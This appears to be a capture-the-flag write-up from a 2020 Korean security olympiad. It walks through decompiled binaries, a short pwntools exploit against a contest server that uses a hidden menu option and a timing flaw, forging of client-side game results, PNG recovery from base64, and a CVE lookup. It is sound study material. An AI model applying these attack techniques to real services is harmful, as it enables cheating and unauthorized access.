# 정보보호 올림피아드 2020 Writeup	
## Q2 | 100 | [bomberman](https://github.com/snwox/Writeup/blob/master/CTF/2020/%EC%A0%95%EB%B3%B4%EB%B3%B4%ED%98%B8%EC%98%AC%EB%A6%BC%ED%94%BC%EC%95%84%EB%93%9C/Q2/bomberman)
```c++
    puts("0. wanted");
    puts("1. start");
    puts("2. reset the timer");
    puts("3. check the left time");
    puts("4. try to remove the bomb");
    puts("5. exit");
    putchar(62); // >
    __isoc99_scanf("%d", &v0);
    switch ( v0 )
    {
      case 0:
        viewWanted();
        break;
      case 1:
        makeThread();
        break;
      case 2:
        resetTimer();
        break;
      case 3:
        checkTimer();
        break;
      case 4:
        removeBomb();
        break;
      case 5:
        exit(0);
        return;
      case 6:
        showFlag();
        break;
      default:
        exit(0);
        return;
    }
```
It's not on the menu, but you can call showFlag() with number 6.
```c++
int showFlag()
{
  int result; // eax

  result = ret;
  if ( !ret )
    result = system("cat home/ubuntu/flag");
  return result;
}
```
But global variable **ret** must be 0
```c++
int makeThread()
{
  pthread_t newthread; // [esp+Ch] [ebp-Ch]

  puts("The Bomb is start to tickin..");
  return pthread_create(&newthread, 0, (void *(*)(void *))t_function, 0);
}

void *t_function()
{
  void *result; // eax

  for ( thread_count = 0; thread_count <= 59; ++thread_count )
  {
    count2 = ++count;
    sleep(4u);
  }
  result = (void *)thread_count;
  if ( thread_count == 60 )
  {
    puts("OOPS.. The bomb has been went off..");
    puts("reset the timer plz..");
    pthread_exit(0);
  }
  return result;
}
```
Thread function increases global varibale **count** every four seconds.
```c++
int removeBomb()
{
  char s; // [esp+Ch] [ebp-1Ch]

  setvbuf(stdout, 0, 1, 0);
  setvbuf(stdin, 0, 1, 0);
  setvbuf(stderr, 0, 1, 0);
  if ( !count )
    return puts("First... you should start!");
  puts("Insert Color Length : ");
  __isoc99_scanf("%d", &count2);
  while ( getchar() != 10 )
    ;
  if ( count2 > 0x14 )
  {
~~~
    exit(0);
  }
  puts("Enter the Color : ");
  memset(&s, 0, 0x14u);
  read(0, &s, count);
  if ( count > 9 )
  {
	~~
    exit(0);
  }
  ret = strcmp(&s, "rainbow");
  while ( getchar() != 10 )
    ;
  return ret;
}
```
To set **ret** to **0**, **s** could be **"rainbow"**. First, I should make thread. Second, Input count2 under 0x14 (24).
```c++
if ( count > 9 ){
	~~~~
	exit(0); 
}
read(0, &s, count);
```
But in read function. Third arg uses **count** instead of count2. **count** must be a number between 7 and 9 to input **s** to **"rainbow"**. To make **count** to 7 ~ 9, sleep 7\*4 ~ 9\*4 seconds after making a thread.

exploit code :  [ex.py](https://github.com/snwox/Writeup/blob/master/CTF/2020/%EC%A0%95%EB%B3%B4%EB%B3%B4%ED%98%B8%EC%98%AC%EB%A6%BC%ED%94%BC%EC%95%84%EB%93%9C/Q2/ex.py)
```python
from pwn import *
r=remote("1.209.148.228",7677)
r.sendline("1")
sleep(25)
r.sendline("4")
r.sendline("10")
r.sendline("rainbow")
r.sendline("6")
r.interactive()
```
But In Server, sleep function does not sleep exactly 4 seconds. So you must sleep about 28-3 ~ 36-3
## Q5 | 100 | zip, HxD hurts em, I was a picture
output file and a zip file with a password were given.
```
ODkgNTAgNEUgNDcgMEQgMEEg~~~~~~ODI=
```
The file size is 0xEEF. The file name was **'HxD hurts me, I was a picture'**. I have seen three bytes repeated, and I have inferred the **RGB** value, but 0xEEF is not divided by three. It ends with = at the end of the file. So I guessed **base64 encoding**
```
89 50 4E 47 ~~~ 49 45 4E 44 AE 42 60 82
```
I decoded that output file, It starts with **‰PNG** and ends with **IEND®B`‚**. It is a PNG file.<br>

![사진](https://github.com/snwox/Writeup/blob/master/CTF/2020/%EC%A0%95%EB%B3%B4%EB%B3%B4%ED%98%B8%EC%98%AC%EB%A6%BC%ED%94%BC%EC%95%84%EB%93%9C/Q5/picture.png)
>zip password


There are packet file and png file.
![사진](https://github.com/snwox/Writeup/blob/master/CTF/2020/%EC%A0%95%EB%B3%B4%EB%B3%B4%ED%98%B8%EC%98%AC%EB%A6%BC%ED%94%BC%EC%95%84%EB%93%9C/Q5/I%20have%20a%20flag/we%20found%20something.png)
Hmm... I should see the identifier in ICMP packets
![사진](https://github.com/snwox/Writeup/blob/master/CTF/2020/%EC%A0%95%EB%B3%B4%EB%B3%B4%ED%98%B8%EC%98%AC%EB%A6%BC%ED%94%BC%EC%95%84%EB%93%9C/res/Q5_1.JPG)
Those packets include a flag.
![사진](https://github.com/snwox/Writeup/blob/master/CTF/2020/%EC%A0%95%EB%B3%B4%EB%B3%B4%ED%98%B8%EC%98%AC%EB%A6%BC%ED%94%BC%EC%95%84%EB%93%9C/res/Q5-1.png)
![사진](https://github.com/snwox/Writeup/blob/master/CTF/2020/%EC%A0%95%EB%B3%B4%EB%B3%B4%ED%98%B8%EC%98%AC%EB%A6%BC%ED%94%BC%EC%95%84%EB%93%9C/res/Q5-2.png)
![사진](https://github.com/snwox/Writeup/blob/master/CTF/2020/%EC%A0%95%EB%B3%B4%EB%B3%B4%ED%98%B8%EC%98%AC%EB%A6%BC%ED%94%BC%EC%95%84%EB%93%9C/res/Q5-3.png)
~
![사진](https://github.com/snwox/Writeup/blob/master/CTF/2020/%EC%A0%95%EB%B3%B4%EB%B3%B4%ED%98%B8%EC%98%AC%EB%A6%BC%ED%94%BC%EC%95%84%EB%93%9C/res/Q5-END.png)
>flag:{N0_P@!n_N0_g@!N}
## Q6 | 100 | packet file
![사진](https://github.com/snwox/Writeup/blob/master/CTF/2020/%EC%A0%95%EB%B3%B4%EB%B3%B4%ED%98%B8%EC%98%AC%EB%A6%BC%ED%94%BC%EC%95%84%EB%93%9C/res/q6-1.JPG)

In the packet file, It sends zip file to the FTP protocol. Right-click -> Follow -> TCP stream
![사진](https://github.com/snwox/Writeup/blob/master/CTF/2020/%EC%A0%95%EB%B3%B4%EB%B3%B4%ED%98%B8%EC%98%AC%EB%A6%BC%ED%94%BC%EC%95%84%EB%93%9C/res/q6-2.png)

Save as a zip file. Then analyze client.exe file. The exefile plays rock-paper-scissors with the server. I should win 1000 times.... but I can't 
![사진](https://github.com/snwox/Writeup/blob/master/CTF/2020/%EC%A0%95%EB%B3%B4%EB%B3%B4%ED%98%B8%EC%98%AC%EB%A6%BC%ED%94%BC%EC%95%84%EB%93%9C/res/q6-3.JPG)

Analyze with **x64 dbg** and found strings. python?? I have heard that python file can be made into exe file. 
>python .\pyinstxtractor.py .\client.exe

I converted client.exe to client.pyc with **pyinstxtractor**. But .pyc file could be decompiled to read correct .py code. 

>33 0D 0D 0A 00 00 00 00 63 00 00 00 00 00 00 00  to 
> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;03 F3 0D 0A 2B 79 67 58 63 00 00 00 00 00 00 00

https://bpsecblog.wordpress.com/2017/01/06/holyshield-ransome/
I tried to decompile with **Easy Python Decompiler**. But the file header has an error. I fixed the file header by referring to that blog and decompiled it again. Success.
## client.py
```python
def  connect_to_server(name, HOST_ADDR, HOST_PORT):

global client

try:
	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	client.connect((HOST_ADDR, HOST_PORT))
	client.send(name)
	btn_connect.config(state=tk.DISABLED)
	ent_name.config(state=tk.DISABLED)
	lbl_name.config(state=tk.DISABLED)
	enable_disable_buttons('disable')
	threading._start_new_thread(receive_message_from_server, (client, 'm'))
except  Exception  as e:
	tkMessageBox.showerror(title='ERROR!!!', message='Cannot connect to host: ' + HOST_ADDR + ' on port: ' + str(HOST_PORT) + ' Server may be Unavailable. Try again later')
```
Set client and make new thread (receive_message_from_server function)
```python
def  receive_message_from_server(sck, m):

global opponent_choice
global opponent_name
global flag
while  True:
	from_server = sck.recv(4096)
	if  not from_server:
		break
if from_server.startswith('welcome'):
	if from_server == 'welcome':
		lbl_welcome['text'] = 'Welcome ' + your_name
		lbl_line_server.pack()

	elif from_server.startswith('opponent_name$'):
		opponent_name = from_server.replace('opponent_name$', '')
		lbl_opponent_name['text'] = 'Opponent: ' + opponent_name
		top_frame.pack()
		middle_frame.pack()
	if client:
		client.send(str(game_round))
		client.send('state$Yes')
		lbl_welcome.config(state=tk.DISABLED)
		lbl_line_server.config(state=tk.DISABLED)
	elif from_server.startswith('$opponent_choice'):
		opponent_choice = from_server.replace('$opponent_choice', '')
		threading._start_new_thread(count_down, (game_timer, ''))
	elif from_server.startswith('flag$'):
		flag = from_server.replace('flag$', '')
		lbl_final_result['text'] = 'flag={' + str(flag) + '}'
		color = 'red'
		lbl_final_result.config(foreground=color)
	break
```
- send the **user name** to the server and receive the opponent name (server). 
- send **0** and **state$Yes**. It seemed to start the game.
- If I win 1000 times, receive **flag**

```python
def  choice(arg):
	global opponent_choice
	global flag
	global client
	global your_choice
	global game_round
	your_choice = arg
	lbl_your_choice['text'] = 'Your choice: ' + your_choice
	lbl_opponent_choice['text'] = 'Opponent choice: ' + opponent_choice
	if client:
		enable_disable_buttons('disable')
		who_wins = game_logic(your_choice, opponent_choice)
	if who_wins == 'you':
		lbl_result['text'] = 'Result: WIN'
		client.send('round$' + str(game_round))
	if flag == None:
		client.send('state$Yes')
	else:
		client.close()
	elif who_wins == 'opponent':
		game_round = 0
		lbl_result['text'] = 'Result: LOSS'
		lbl_final_result['text'] = 'Game Out'
		lbl_final_result.config(foreground=color)
		client.close()
```
The winning decision is made on the client. So I can manipulate the results. If I win, It sends **round\${game_round}** and **state$Yes**. Else, just close the client.
```python
def  count_down(my_timer, nothing):
global game_round
if game_round <= TOTAL_NO_OF_ROUNDS:
	game_round = game_round + 1
	lbl_game_round['text'] = 'Game round ' + str(game_round) + ' starts in'
```
the game_round is increased by 1. <br>So I can win 1000 times by sending data **"round$0" + "state\$Yes"** ~ **"round$1000"+"state\$Yes"**

exploit code : [ex.py](https://github.com/snwox/Writeup/blob/master/CTF/2020/%EC%A0%95%EB%B3%B4%EB%B3%B4%ED%98%B8%EC%98%AC%EB%A6%BC%ED%94%BC%EC%95%84%EB%93%9C/Q6/ex.py)
## Q10 | 100
>This issue can be exploited by LDAP search expressions that have caused the LDAP server process to stop responding.

The Q10 is to find that CVE number.
http://update.secui.com/vuln_detail_desc.asp?id=23292&page=24
I found it on that site. 
>CVE-2019-3824
